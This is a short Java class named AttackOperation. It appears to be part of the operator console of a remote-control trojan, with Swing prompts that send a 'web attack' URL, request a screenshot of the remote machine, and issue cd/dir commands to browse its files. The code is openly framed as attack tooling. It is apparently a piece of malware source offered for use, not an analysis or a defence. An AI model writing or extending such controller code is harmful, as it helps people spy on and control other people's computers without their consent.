import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;

import javax.swing.JFrame;
import javax.swing.JOptionPane;

public class AttackOperation {
	static String send="",recive="";
	
	public static void webAttack(JFrame j,DataInputStream din,DataOutputStream dout)throws Exception{
		String str = "Enter the web url :";
		send = JOptionPane.showInputDialog(j,str);;
		dout.writeUTF(send);
		recive = din.readUTF();
		JOptionPane.showMessageDialog(j, recive);		
	}
	
	
	public static String screenshot(JFrame j){
		
		String str = "Enter the path to store the screenshot :\nExample = D:\\Shot.jpg";
		send = JOptionPane.showInputDialog(j,str);;
		return "path`"+send; 
		
		
	}
	
	public static String fileExplore(JFrame j){
		
		String str = "Enter the command to explore :\nExamples:\n cd = change folder directory\n dir = list items";
		send = JOptionPane.showInputDialog(j,str);;
		return "dir`"+send; 
		
		
	}
	
	
}
